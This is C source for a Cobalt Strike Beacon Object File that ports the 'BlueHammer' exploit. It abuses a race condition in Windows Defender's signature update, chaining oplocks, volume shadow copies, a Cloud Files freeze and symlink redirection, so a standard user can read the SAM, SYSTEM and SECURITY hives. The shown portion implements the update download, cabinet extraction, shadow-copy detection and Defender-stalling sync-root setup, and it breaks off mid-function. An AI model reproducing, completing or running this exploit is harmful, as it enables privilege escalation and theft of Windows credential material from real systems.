/*
 * bh_leak.c - BlueHammer File Leak BOF
 *
 * Leaks protected files (SAM, SYSTEM, SECURITY) from a Windows system by
 * exploiting TOCTOU race conditions in Windows Defender's signature update
 * mechanism. Chains oplock abuse, VSS creation, Cloud Files API freeze,
 * and junction+symlink redirection to read locked files.
 *
 * Usage: bh_leak [/dump:sam|system|security|all] [/verbose]
 *
 * Ported from BlueHammer (FunnyApp.cpp) by Tom Gallagher, Igor Tsyganskiy,
 * and Jeremy Tinder. Converted to Cobalt Strike BOF format.
 *
 * Requirements:
 *   - Windows Defender must be running
 *   - Internet access (downloads Defender update from Microsoft CDN)
 *   - Standard user privileges (no admin required)
 */

#include <windows.h>
#include <wininet.h>
#include <fdi.h>
#include <winternl.h>
#include <cfapi.h>
#include <Shlwapi.h>
#include "../beacon.h"
#include "include/bh_dfr.h"
#include "include/bh_rpc.h"

/* ============================================================================
 * Structures
 * ============================================================================ */

struct WDRPCWorkerThreadArgs {
    HANDLE hntfythread;
    HANDLE hevent;
    RPC_STATUS res;
    wchar_t* dirpath;
    BH_RPC_STATE* rpcState;
};

struct CabOpArguments {
    ULONG index;
    char* filename;
    size_t ptroffset;
    char* buff;
    DWORD FileSize;
    struct CabOpArguments* first;
    struct CabOpArguments* next;
};

struct UpdateFiles {
    char filename[MAX_PATH];
    void* filebuff;
    DWORD filesz;
    BOOL filecreated;
    struct UpdateFiles* next;
};

struct cldcallbackctx {
    HANDLE hnotifywdaccess;
    HANDLE hnotifylockcreated;
    wchar_t filename[MAX_PATH];
};

struct LLShadowVolumeNames {
    wchar_t* name;
    struct LLShadowVolumeNames* next;
};

struct cloudworkerthreadargs {
    HANDLE hlock;
    HANDLE hcleanupevent;
    HANDLE hvssready;
    wchar_t syncroot[MAX_PATH];
};

/* Resolved ntdll function pointers */
static fn_NtCreateSymbolicLinkObject g_pNtCreateSymbolicLinkObject = NULL;
static fn_NtOpenDirectoryObject      g_pNtOpenDirectoryObject = NULL;
static fn_NtQueryDirectoryObject     g_pNtQueryDirectoryObject = NULL;
static fn_NtSetInformationFile       g_pNtSetInformationFile = NULL;

/* Resolved cldapi function pointers */
static fn_CfRegisterSyncRoot   g_pCfRegisterSyncRoot = NULL;
static fn_CfConnectSyncRoot    g_pCfConnectSyncRoot = NULL;
static fn_CfDisconnectSyncRoot g_pCfDisconnectSyncRoot = NULL;
static fn_CfUnregisterSyncRoot g_pCfUnregisterSyncRoot = NULL;
static fn_CfExecute            g_pCfExecute = NULL;

/* Global output buffer */
static formatp* g_output = NULL;

/* ============================================================================
 * Helper macros
 * ============================================================================ */

#define RtlOffsetToPointer(Base, Offset) ((PUCHAR)(((PUCHAR)(Base)) + ((ULONG_PTR)(Offset))))

#define LOG(fmt, ...) do { \
    if (g_output) BeaconFormatPrintf(g_output, fmt, ##__VA_ARGS__); \
} while(0)

#define LOGERR(fmt, ...) do { \
    if (g_output) BeaconFormatPrintf(g_output, "[-] " fmt, ##__VA_ARGS__); \
} while(0)

#define LOGOK(fmt, ...) do { \
    if (g_output) BeaconFormatPrintf(g_output, "[+] " fmt, ##__VA_ARGS__); \
} while(0)

#define LOGINFO(fmt, ...) do { \
    if (g_output) BeaconFormatPrintf(g_output, "[*] " fmt, ##__VA_ARGS__); \
} while(0)

/* ============================================================================
 * Resolve runtime function pointers
 * ============================================================================ */

static BOOL ResolveNtdllFunctions(void)
{
    HMODULE hm = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if (!hm) return FALSE;

    g_pNtCreateSymbolicLinkObject = (fn_NtCreateSymbolicLinkObject)GetProcAddress(hm, "NtCreateSymbolicLinkObject");
    g_pNtOpenDirectoryObject = (fn_NtOpenDirectoryObject)GetProcAddress(hm, "NtOpenDirectoryObject");
    g_pNtQueryDirectoryObject = (fn_NtQueryDirectoryObject)GetProcAddress(hm, "NtQueryDirectoryObject");
    g_pNtSetInformationFile = (fn_NtSetInformationFile)GetProcAddress(hm, "NtSetInformationFile");

    return (g_pNtCreateSymbolicLinkObject && g_pNtOpenDirectoryObject &&
            g_pNtQueryDirectoryObject && g_pNtSetInformationFile);
}

static BOOL ResolveCldApiFunctions(void)
{
    HMODULE hm = LoadLibraryA("cldapi.dll");
    if (!hm) return FALSE;

    g_pCfRegisterSyncRoot = (fn_CfRegisterSyncRoot)GetProcAddress(hm, "CfRegisterSyncRoot");
    g_pCfConnectSyncRoot = (fn_CfConnectSyncRoot)GetProcAddress(hm, "CfConnectSyncRoot");
    g_pCfDisconnectSyncRoot = (fn_CfDisconnectSyncRoot)GetProcAddress(hm, "CfDisconnectSyncRoot");
    g_pCfUnregisterSyncRoot = (fn_CfUnregisterSyncRoot)GetProcAddress(hm, "CfUnregisterSyncRoot");
    g_pCfExecute = (fn_CfExecute)GetProcAddress(hm, "CfExecute");

    return (g_pCfRegisterSyncRoot && g_pCfConnectSyncRoot &&
            g_pCfDisconnectSyncRoot && g_pCfUnregisterSyncRoot && g_pCfExecute);
}

/* ============================================================================
 * Cabinet (FDI) callback functions for update extraction
 * ============================================================================ */

static void* g_cabbuff2 = NULL;
static DWORD g_cabbuffsz = 0;

static struct CabOpArguments* CUST_FNOPEN(const char* filename, int oflag, int pmode)
{
    struct CabOpArguments* cbps = (struct CabOpArguments*)malloc(sizeof(struct CabOpArguments));
    ZeroMemory(cbps, sizeof(struct CabOpArguments));
    cbps->buff = (char*)g_cabbuff2;
    cbps->FileSize = g_cabbuffsz;
    return cbps;
}

static INT CUST_FNSEEK(HANDLE hf, long offset, int origin)
{
    if (hf) {
        struct CabOpArguments* args = (struct CabOpArguments*)hf;
        if (origin == SEEK_SET)      args->ptroffset = offset;
        else if (origin == SEEK_CUR) args->ptroffset += offset;
        else if (origin == SEEK_END) args->ptroffset += args->FileSize;
        return (INT)args->ptroffset;
    }
    return -1;
}

static UINT CUST_FNREAD(struct CabOpArguments* hf, void* buffer, unsigned buffer_size)
{
    if (hf && hf->buff) {
        memmove(buffer, &hf->buff[hf->ptroffset], buffer_size);
        hf->ptroffset += buffer_size;
        return buffer_size;
    }
    return 0;
}

static UINT CUST_FNWRITE(struct CabOpArguments* hf, const void* buffer, unsigned int count)
{
    if (hf && hf->buff) {
        memmove(&hf->buff[hf->ptroffset], buffer, count);
        hf->ptroffset += count;
        return count;
    }
    return 0;
}

static INT CUST_FNCLOSE(struct CabOpArguments* fnFileClose)
{
    free(fnFileClose);
    return 0;
}

static VOID* CUST_FNALLOC(size_t cb) { return malloc(cb); }
static VOID CUST_FNFREE(void* buff) { free(buff); }

static INT_PTR CUST_FNFDINOTIFY(FDINOTIFICATIONTYPE fdinotify, PFDINOTIFICATION pfdin)
{
    struct CabOpArguments** ptr = NULL;
    struct CabOpArguments* lcab = NULL;

    switch (fdinotify) {
    case fdintCOPY_FILE:
        if (_stricmp(pfdin->psz1, "MpSigStub.exe") == 0)
            return 0;

        ptr = (struct CabOpArguments**)pfdin->pv;
        lcab = *ptr;
        if (lcab == NULL) {
            lcab = (struct CabOpArguments*)malloc(sizeof(struct CabOpArguments));
            ZeroMemory(lcab, sizeof(struct CabOpArguments));
            lcab->first = lcab;
        } else {
            lcab->next = (struct CabOpArguments*)malloc(sizeof(struct CabOpArguments));
            ZeroMemory(lcab->next, sizeof(struct CabOpArguments));
            lcab->next->first = lcab->first;
            lcab = lcab->next;
        }
        lcab->filename = (char*)malloc(strlen(pfdin->psz1) + 1);
        ZeroMemory(lcab->filename, strlen(pfdin->psz1) + 1);
        memmove(lcab->filename, pfdin->psz1, strlen(pfdin->psz1));
        lcab->FileSize = pfdin->cb;
        lcab->buff = (char*)malloc(lcab->FileSize);
        ZeroMemory(lcab->buff, lcab->FileSize);
        lcab->first->index++;
        *ptr = lcab;
        return (INT_PTR)lcab;

    case fdintCLOSE_FILE_INFO:
        return TRUE;

    default:
        return 0;
    }
}

/* ============================================================================
 * Extract cabinet file from PE resource section
 * ============================================================================ */

static void* GetCabFileFromBuff(PIMAGE_DOS_HEADER pvRawData, ULONG cbRawData, ULONG* cabsz)
{
    ULONG e_lfanew, s, NumberOfSections, Size;
    PIMAGE_NT_HEADERS pinth;
    PIMAGE_SECTION_HEADER pish;

    if (cbRawData < sizeof(IMAGE_DOS_HEADER) || pvRawData->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    e_lfanew = pvRawData->e_lfanew;
    s = e_lfanew + sizeof(IMAGE_NT_HEADERS);
    if (e_lfanew >= s || s > cbRawData)
        return NULL;

    pinth = (PIMAGE_NT_HEADERS)RtlOffsetToPointer(pvRawData, e_lfanew);
    if (pinth->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    s = FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + pinth->FileHeader.SizeOfOptionalHeader;
    NumberOfSections = pinth->FileHeader.NumberOfSections;
    pish = (PIMAGE_SECTION_HEADER)RtlOffsetToPointer(pinth, s);

    while (NumberOfSections--) {
        Size = min(pish->Misc.VirtualSize, pish->SizeOfRawData);
        if (Size > 0) {
            char rsrc[] = ".rsrc";
            if (memcmp(pish->Name, rsrc, sizeof(rsrc)) == 0) {
                typedef struct {
                    DWORD Characteristics, TimeDateStamp;
                    WORD MajorVersion, MinorVersion, NumberOfNamedEntries, NumberOfIdEntries;
                    IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[1];
                } RESDIR;

                RESDIR* pird = (RESDIR*)RtlOffsetToPointer(pvRawData, pish->PointerToRawData);
                RESDIR* prsrc = pird;
                IMAGE_RESOURCE_DIRECTORY_ENTRY* pirde;
                IMAGE_RESOURCE_DATA_ENTRY* pdata;

                while (pird->NumberOfNamedEntries + pird->NumberOfIdEntries) {
                    pirde = &pird->DirectoryEntries[0];
                    if (!pirde->DataIsDirectory) {
                        pdata = (IMAGE_RESOURCE_DATA_ENTRY*)RtlOffsetToPointer(prsrc, pirde->OffsetToData);
                        pdata->OffsetToData -= pish->VirtualAddress - pish->PointerToRawData;
                        if (cabsz) *cabsz = pdata->Size;
                        return RtlOffsetToPointer(pvRawData, pdata->OffsetToData);
                    }
                    pird = (RESDIR*)RtlOffsetToPointer(prsrc, pirde->OffsetToDirectory);
                }
                break;
            }
        }
        pish++;
    }
    return NULL;
}

/* ============================================================================
 * Download and extract Defender update files
 * ============================================================================ */

static struct UpdateFiles* GetUpdateFiles(void)
{
    HINTERNET hint = NULL, hint2 = NULL;
    char data[0x1000];
    DWORD index = 0, sz = sizeof(data), readsz = 0;
    void* exebuff = NULL;
    void* mappedbuff = NULL;
    ULONG ressz = 0;
    ERF erfstruct;
    HFDI hcabctx = NULL;
    BOOL extractres = FALSE;
    struct CabOpArguments* CabOpArgs = NULL;
    struct UpdateFiles* firstupdt = NULL;
    struct UpdateFiles* current = NULL;

    ZeroMemory(data, sizeof(data));
    ZeroMemory(&erfstruct, sizeof(erfstruct));

    LOGINFO("Downloading Defender updates from Microsoft CDN...\n");

    hint = WININET$InternetOpenW(L"Chrome/141.0.0.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hint) { LOGERR("InternetOpen failed: %d\n", GetLastError()); goto dl_cleanup; }

    hint2 = WININET$InternetOpenUrlW(hint,
        L"https://go.microsoft.com/fwlink/?LinkID=121721&arch=x64",
        NULL, 0,
        INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS |
        INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD, 0);
    if (!hint2) { LOGERR("InternetOpenUrl failed: %d\n", GetLastError()); goto dl_cleanup; }

    if (!WININET$HttpQueryInfoW(hint2, HTTP_QUERY_CONTENT_LENGTH, data, &sz, &index)) {
        LOGERR("HttpQueryInfo failed: %d\n", GetLastError()); goto dl_cleanup;
    }

    sz = _wtoi((LPWSTR)data);
    exebuff = malloc(sz);
    if (!exebuff) { LOGERR("Failed to allocate %u bytes\n", sz); goto dl_cleanup; }
    ZeroMemory(exebuff, sz);

    if (!WININET$InternetReadFile(hint2, exebuff, sz, &readsz) || readsz != sz) {
        LOGERR("Download failed: %d\n", GetLastError()); goto dl_cleanup;
    }
    LOGOK("Downloaded mpam-fe.exe (%u bytes)\n", sz);

    WININET$InternetCloseHandle(hint); hint = NULL;
    WININET$InternetCloseHandle(hint2); hint2 = NULL;

    mappedbuff = GetCabFileFromBuff((PIMAGE_DOS_HEADER)exebuff, sz, &ressz);
    if (!mappedbuff) { LOGERR("Failed to locate cabinet in downloaded file\n"); goto dl_cleanup; }

    g_cabbuff2 = mappedbuff;
    g_cabbuffsz = ressz;

    LOGINFO("Extracting cabinet content...\n");
    hcabctx = CABINET$FDICreate((PFNALLOC)CUST_FNALLOC, CUST_FNFREE, (PFNOPEN)CUST_FNOPEN,
        (PFNREAD)CUST_FNREAD, (PFNWRITE)CUST_FNWRITE, (PFNCLOSE)CUST_FNCLOSE,
        (PFNSEEK)CUST_FNSEEK, cpuUNKNOWN, &erfstruct);
    if (!hcabctx) { LOGERR("FDICreate failed: 0x%x\n", erfstruct.erfOper); goto dl_cleanup; }

    extractres = CABINET$FDICopy(hcabctx, (char*)"\\update.cab", (char*)"C:\\temp", 0,
        (PFNFDINOTIFY)CUST_FNFDINOTIFY, NULL, &CabOpArgs);
    if (!extractres) { LOGERR("FDICopy failed: 0x%x\n", erfstruct.erfOper); goto dl_cleanup; }
    CABINET$FDIDestroy(hcabctx); hcabctx = NULL;

    if (!CabOpArgs) { LOGERR("Empty cabinet\n"); goto dl_cleanup; }

    CabOpArgs = CabOpArgs->first;
    firstupdt = (struct UpdateFiles*)malloc(sizeof(struct UpdateFiles));
    ZeroMemory(firstupdt, sizeof(struct UpdateFiles));
    current = firstupdt;

    while (CabOpArgs) {
        strcpy(current->filename, CabOpArgs->filename);
        current->filebuff = malloc(CabOpArgs->FileSize);
        memmove(current->filebuff, CabOpArgs->buff, CabOpArgs->FileSize);
        current->filesz = CabOpArgs->FileSize;
        CabOpArgs = CabOpArgs->next;
        if (CabOpArgs) {
            current->next = (struct UpdateFiles*)malloc(sizeof(struct UpdateFiles));
            ZeroMemory(current->next, sizeof(struct UpdateFiles));
            current = current->next;
        }
    }
    LOGOK("Cabinet extracted successfully\n");

dl_cleanup:
    if (CabOpArgs) {
        struct CabOpArguments* cur = CabOpArgs->first;
        while (cur) {
            free(cur->buff); free(cur->filename);
            struct CabOpArguments* tmp = cur;
            cur = cur->next;
            free(tmp);
        }
    }
    if (hint) WININET$InternetCloseHandle(hint);
    if (hint2) WININET$InternetCloseHandle(hint2);
    if (exebuff) free(exebuff);
    return firstupdt;
}

/* ============================================================================
 * Volume Shadow Copy Functions
 * ============================================================================ */

static void rev(char* s)
{
    int l = 0, r = (int)strlen(s) - 1;
    while (l < r) { char t = s[l]; s[l] = s[r]; s[r] = t; l++; r--; }
}

static void DestroyVSSNamesList(struct LLShadowVolumeNames* First)
{
    while (First) {
        free(First->name);
        struct LLShadowVolumeNames* next = First->next;
        free(First);
        First = next;
    }
}

static struct LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, BOOL* criticalerr, int* vscnumber, DWORD* errorcode)
{
    ULONG scanctx = 0;
    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz = 0;
    OBJECT_DIRECTORY_INFORMATION* objdirinfo;
    NTSTATUS stat;
    struct LLShadowVolumeNames* LLVSScurrent = NULL;
    struct LLShadowVolumeNames* LLVSSfirst = NULL;
    void* emptybuff;

    *vscnumber = 0;
    objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
    if (!objdirinfo) { *criticalerr = TRUE; *errorcode = ERROR_NOT_ENOUGH_MEMORY; return NULL; }
    ZeroMemory(objdirinfo, reqsz);

    do {
        stat = g_pNtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
        if (stat == 0) break;
        else if (stat != 0x80000006 /*STATUS_MORE_ENTRIES*/) {
            *criticalerr = TRUE;
            *errorcode = NTDLL$RtlNtStatusToDosError(stat);
            free(objdirinfo);
            return NULL;
        }
        free(objdirinfo);
        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
        if (!objdirinfo) { *criticalerr = TRUE; *errorcode = ERROR_NOT_ENOUGH_MEMORY; return NULL; }
        ZeroMemory(objdirinfo, reqsz);
    } while (1);

    emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));

    for (ULONG i = 0; i < ULONG_MAX; i++) {
        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0) break;
        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0) {
            wchar_t cmpstr[] = L"HarddiskVolumeShadowCopy";
            if (objdirinfo[i].Name.Length >= sizeof(cmpstr) - sizeof(wchar_t)) {
                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0) {
                    (*vscnumber)++;
                    struct LLShadowVolumeNames* newnode = (struct LLShadowVolumeNames*)malloc(sizeof(struct LLShadowVolumeNames));
                    if (!newnode) { *criticalerr = TRUE; *errorcode = ERROR_NOT_ENOUGH_MEMORY; DestroyVSSNamesList(LLVSSfirst); free(objdirinfo); free(emptybuff); return NULL; }
                    ZeroMemory(newnode, sizeof(struct LLShadowVolumeNames));
                    newnode->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
                    ZeroMemory(newnode->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
                    memmove(newnode->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
                    if (LLVSScurrent) LLVSScurrent->next = newnode;
                    else LLVSSfirst = newnode;
                    LLVSScurrent = newnode;
                }
            }
        }
    }
    free(emptybuff);
    free(objdirinfo);
    return LLVSSfirst;
}

static DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
{
    wchar_t devicepath[] = L"\\Device";
    UNICODE_STRING udevpath;
    OBJECT_ATTRIBUTES objattr;
    NTSTATUS stat;
    HANDLE hobjdir = NULL;
    DWORD retval = ERROR_SUCCESS;
    wchar_t newvsspath[MAX_PATH];
    BOOL criterr = FALSE;
    int vscnum = 0;
    BOOL restartscan = FALSE;
    ULONG scanctx = 0;
    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
    ULONG retsz = 0;
    OBJECT_DIRECTORY_INFORMATION* objdirinfo = NULL;
    BOOL srchfound = FALSE;
    struct LLShadowVolumeNames* vsinitial = NULL;
    void* emptybuff = NULL;

    wcscpy(newvsspath, L"\\Device\\");
    NTDLL$RtlInitUnicodeString(&udevpath, devicepath);
    ZeroMemory(&objattr, sizeof(objattr));
    objattr.Length = sizeof(OBJECT_ATTRIBUTES);
    objattr.ObjectName = &udevpath;
    objattr.Attributes = OBJ_CASE_INSENSITIVE;

    stat = g_pNtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
    if (stat) { retval = NTDLL$RtlNtStatusToDosError(stat); return retval; }

    emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
    if (!emptybuff) { retval = ERROR_NOT_ENOUGH_MEMORY; goto scf_cleanup; }
    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));

    vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum, &retval);
    if (criterr) goto scf_cleanup;

scanagain:
    do {
        if (objdirinfo) free(objdirinfo);
        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
        if (!objdirinfo) { retval = ERROR_NOT_ENOUGH_MEMORY; goto scf_cleanup; }
        ZeroMemory(objdirinfo, reqsz);
        scanctx = 0;
        stat = g_pNtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
        if (stat == 0) break;
        else if (stat != 0x80000006) { retval = NTDLL$RtlNtStatusToDosError(stat); goto scf_cleanup; }
        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
    } while (1);

    for (ULONG i = 0; i < ULONG_MAX; i++) {
        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0) break;
        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0) {
            wchar_t cmpstr[] = L"HarddiskVolumeShadowCopy";
            if (objdirinfo[i].Name.Length >= sizeof(cmpstr) - sizeof(wchar_t)) {
                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0) {
                    struct LLShadowVolumeNames* cur = vsinitial;
                    BOOL found = FALSE;
                    while (cur) {
                        if (_wcsicmp(cur->name, objdirinfo[i].Name.Buffer) == 0) { found = TRUE; break; }
                        cur = cur->next;
                    }
                    if (!found) {
                        srchfound = TRUE;
                        wcscat(newvsspath, objdirinfo[i].Name.Buffer);
                        break;
                    }
                }
            }
        }
    }

    if (!srchfound) { restartscan = TRUE; Sleep(50); goto scanagain; }
    if (objdirinfo) { free(objdirinfo); objdirinfo = NULL; }
    NTDLL$NtClose(hobjdir); hobjdir = NULL;

    /* Validate VSS is accessible */
    {
        wchar_t vsswinpath[MAX_PATH];
        UNICODE_STRING _vsswinpath;
        OBJECT_ATTRIBUTES objattr2;
        IO_STATUS_BLOCK iostat;
        HANDLE hlk = NULL;

        wcscpy(vsswinpath, newvsspath);
        wcscat(vsswinpath, L"\\Windows");
        NTDLL$RtlInitUnicodeString(&_vsswinpath, vsswinpath);
        ZeroMemory(&objattr2, sizeof(objattr2));
        objattr2.Length = sizeof(OBJECT_ATTRIBUTES);
        objattr2.ObjectName = &_vsswinpath;
        objattr2.Attributes = OBJ_CASE_INSENSITIVE;

        do {
            stat = NTDLL$NtCreateFile(&hlk, FILE_READ_ATTRIBUTES, &objattr2, &iostat, NULL, 0, 0, FILE_OPEN, 0, NULL, 0);
        } while (stat == 0xC000000E /* STATUS_NO_SUCH_DEVICE */);

        if (stat) { retval = NTDLL$RtlNtStatusToDosError(stat); goto scf_cleanup; }
        CloseHandle(hlk);
    }

    if (fullvsspath)
        wcscpy((wchar_t*)fullvsspath, newvsspath);

scf_cleanup:
    if (hobjdir) NTDLL$NtClose(hobjdir);
    if (emptybuff) free(emptybuff);
    if (vsinitial) DestroyVSSNamesList(vsinitial);
    return retval;
}

/* ============================================================================
 * Get Windows Defender PID
 * ============================================================================ */

static DWORD GetWDPID(void)
{
    SC_HANDLE scmgr, hsvc;
    SERVICE_STATUS_PROCESS ssp;
    DWORD reqsz = sizeof(ssp);
    DWORD pid = 0;

    scmgr = ADVAPI32$OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scmgr) return 0;
    hsvc = ADVAPI32$OpenServiceW(scmgr, L"WinDefend", SERVICE_QUERY_STATUS);
    ADVAPI32$CloseServiceHandle(scmgr);
    if (!hsvc) return 0;

    if (ADVAPI32$QueryServiceStatusEx(hsvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, reqsz, &reqsz))
        pid = ssp.dwProcessId;
    ADVAPI32$CloseServiceHandle(hsvc);
    return pid;
}

/* ============================================================================
 * Cloud Files callback - identifies when Defender queries the sync root
 * ============================================================================ */

static void CALLBACK CfCallbackFetchPlaceHolders(
    const CF_CALLBACK_INFO* CallbackInfo,
    const CF_CALLBACK_PARAMETERS* CallbackParameters)
{
    CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;

    if (GetWDPID() == cpi->ProcessId) {
        struct cldcallbackctx* ctx = (struct cldcallbackctx*)CallbackInfo->CallbackContext;
        SetEvent(ctx->hnotifywdaccess);

        /* Build placeholder response */
        CF_OPERATION_INFO cfopinfo;
        ZeroMemory(&cfopinfo, sizeof(cfopinfo));
        cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
        cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
        cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
        cfopinfo.TransferKey = CallbackInfo->TransferKey;
        cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
        cfopinfo.RequestKey = CallbackInfo->RequestKey;

        SYSTEMTIME systime;
        FILETIME filetime;
        KERNEL32$GetSystemTime(&systime);
        KERNEL32$SystemTimeToFileTime(&systime, &filetime);

        FILE_BASIC_INFO fbi;
        ZeroMemory(&fbi, sizeof(fbi));
        fbi.FileAttributes = FILE_ATTRIBUTE_NORMAL;
        CF_FS_METADATA fsmetadata;
        ZeroMemory(&fsmetadata, sizeof(fsmetadata));
        fsmetadata.BasicInfo = fbi;
        fsmetadata.FileSize.QuadPart = 0x1000;

        UUID uid;
        RPC_WSTR wuid;
        RPCRT4$UuidCreate(&uid);
        RPCRT4$UuidToStringW(&uid, &wuid);

        CF_PLACEHOLDER_CREATE_INFO placeholder[1];
        ZeroMemory(placeholder, sizeof(placeholder));
        placeholder[0].RelativeFileName = ctx->filename;
        placeholder[0].FsMetadata = fsmetadata;
        placeholder[0].FileIdentity = wuid;
        placeholder[0].FileIdentityLength = wcslen((wchar_t*)wuid) * sizeof(wchar_t);
        placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;

        CF_OPERATION_PARAMETERS cfopparams;
        ZeroMemory(&cfopparams, sizeof(cfopparams));
        cfopparams.ParamSize = sizeof(cfopparams);
        cfopparams.TransferPlaceholders.PlaceholderCount = 1;
        cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 1;
        cfopparams.TransferPlaceholders.PlaceholderArray = placeholder;

        WaitForSingleObject(ctx->hnotifylockcreated, INFINITE);
        g_pCfExecute(&cfopinfo, &cfopparams);
        return;
    }

    /* Non-Defender caller: return empty placeholder list */
    CF_OPERATION_INFO cfopinfo;
    ZeroMemory(&cfopinfo, sizeof(cfopinfo));
    cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
    cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
    cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
    cfopinfo.TransferKey = CallbackInfo->TransferKey;
    cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
    cfopinfo.RequestKey = CallbackInfo->RequestKey;

    CF_OPERATION_PARAMETERS cfopparams;
    ZeroMemory(&cfopparams, sizeof(cfopparams));
    cfopparams.ParamSize = sizeof(cfopparams);
    g_pCfExecute(&cfopinfo, &cfopparams);
}

/* ============================================================================
 * Freeze WD via Cloud Files oplock
 * ============================================================================ */

static DWORD WINAPI FreezeVSS(void* arg)
{
    struct cloudworkerthreadargs* args = (struct cloudworkerthreadargs*)arg;
    if (!args) return ERROR_BAD_ARGUMENTS;

    HANDLE hlock = NULL;
    HRESULT hs;
    DWORD retval = ERROR_SUCCESS;
    BOOL syncrootregistered = FALSE;
    CF_CONNECTION_KEY cfkey = { 0 };
    OVERLAPPED ovd;
    DWORD nwf = 0;
    struct cldcallbackctx callbackctx;

    CF_SYNC_REGISTRATION cfreg;
    ZeroMemory(&cfreg, sizeof(cfreg));
    cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    cfreg.ProviderName = L"IHATEMICROSOFT";
    cfreg.ProviderVersion = L"1.0";

    CF_SYNC_POLICIES syncpolicy;
    ZeroMemory(&syncpolicy, sizeof(syncpolicy));
    syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
    syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
    syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    syncpolicy.InSync = CF_INSYNC_POLICY_NONE;

    CF_CALLBACK_REGISTRATION callbackreg[2];
    callbackreg[0].Type = CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS;
    callbackreg[0].Callback = CfCallbackFetchPlaceHolders;
    callbackreg[1].Type = CF_CALLBACK_TYPE_NONE;
    callbackreg[1].Callback = NULL;

    ZeroMemory(&callbackctx, sizeof(callbackctx));
    callbackctx.hnotifywdaccess = CreateEventW(NULL, FALSE, FALSE, NULL);
    callbackctx.hnotifylockcreated = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!callbackctx.hnotifylockcreated || !callbackctx.hnotifywdaccess) {
        retval = GetLastError(); goto fvss_cleanup;
    }

    /* Create lock file with GUID name */
    {
        UUID uid;
        RPC_WSTR wuid;
        wchar_t lockfile[MAX_PATH];

        RPCRT4$UuidCreate(&uid);
        RPCRT4$UuidToStringW(&uid, &wuid);
        wcscpy(lockfile, args->syncroot);
        wcscat(lockfile, L"\\");
        wcscat(lockfile, (wchar_t*)wuid);
        wcscat(lockfile, L".lock");
        wcscpy(callbackctx.filename, (wchar_t*)wuid);
        wcscat(callbackctx.filename, L".lock");

        hlock = CreateFileW(lockfile, GENERIC_ALL, FILE_SHARE_READ, NULL,
            CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, NULL);
        if (!hlock || hlock == INVALID_HANDLE_VALUE) {
            retval = GetLastError(); goto fvss_cleanup;
        }
    }

    hs = (HRESULT)g_pCfRegisterSyncRoot(args->syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
    if (hs) { retval = ERROR_UNIDENTIFIED_ERROR; goto fvss_cleanup; }
